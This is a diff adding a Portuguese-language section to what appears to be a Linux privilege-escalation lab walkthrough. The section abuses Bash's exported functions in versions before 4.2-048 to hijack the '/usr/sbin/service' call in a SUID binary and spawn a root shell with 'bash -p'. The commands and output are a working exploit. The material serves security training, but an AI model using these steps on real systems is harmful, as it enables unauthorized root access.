@@ -699,4 +699,52 @@ root@debian:~#
 
 - a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
 
+## 14 - SUID / SGID Executables - Abusing Shell Features (#1) 
 
+O executável ***/usr/local/bin/suid-env2*** é idêntico ao ***/usr/local/bin/suid-env***, exceto que ele usa o caminho absoluto do executável do serviço (***/usr/sbin/service***) para iniciar o servidor web apache2.
+
+Verifique isso com strings:
+```shell
+user@debian:~$ strings /usr/local/bin/suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+```
+Nas versões do Bash <4.2-048, é possível definir funções de shell com nomes que se assemelham a caminhos de arquivo e, em seguida, exportar essas funções para que sejam usadas em vez de qualquer executável real nesse caminho de arquivo.
+
+Verifique se a versão do Bash instalada na VM Debian é menor que 4.2-048:
+
+```shell
+user@debian:~$ /bin/bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+```
+
+Então, pode-se criar uma função Bash com o nome "***/usr/sbin/service***" que executa um novo shell Bash (usando -p para que as permissões sejam preservadas) e exporte a função:
+
+```shell
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
+
+Agora, basta executar:
+
+```shell
+/usr/local/bin/suid-env2
+```
+Um bash como superusuário será iniciado.
